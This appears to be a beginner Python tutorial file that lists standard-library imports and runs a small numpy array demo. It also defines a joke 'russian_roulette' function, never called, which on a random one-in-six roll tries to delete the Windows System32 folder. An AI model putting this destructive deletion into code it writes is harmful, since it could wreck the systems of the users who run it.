# Internal imports
import calendar  # For working with calendar-related functions
import datetime  # For working with dates and times
import math  # For mathematical functions
import os  # For interacting with the operating system
import random  # For working with random numbers

import sys  # For accessing system-specific parameters and functions
import time  # For time-related functions

# from .basics_1 import * # Importing all functions and variables from basics_1.py

# Russian Roulette
# WARNING: This function is dangerous and should not be executed. It is intended for educational purposes only.

def russian_roulette():
    if random.randint(1, 6) == 1:
        os.remove("C:\\Windows\\System32\\")



# Third-party imports (from PyPi)

import numpy as np # For working with arrays and numerical operations

# Simple numpy demonstration
def numpy_demo():
    # Create arrays
    arr1 = np.array([1, 2, 3, 4, 5])
    arr2 = np.array([10, 20, 30, 40, 50])
    
    # Basic operations
    print("Array 1:", arr1)
    print("Array 2:", arr2)
    print("Sum:", arr1 + arr2)
    print("Product:", arr1 * arr2)
    print("Mean of arr1:", np.mean(arr1))
    print("Standard deviation:", np.std(arr1))
    
    # 2D array
    matrix = np.array([[1, 2, 3], [4, 5, 6]])
    print("Matrix shape:", matrix.shape)
    print("Matrix:\n", matrix)

numpy_demo()
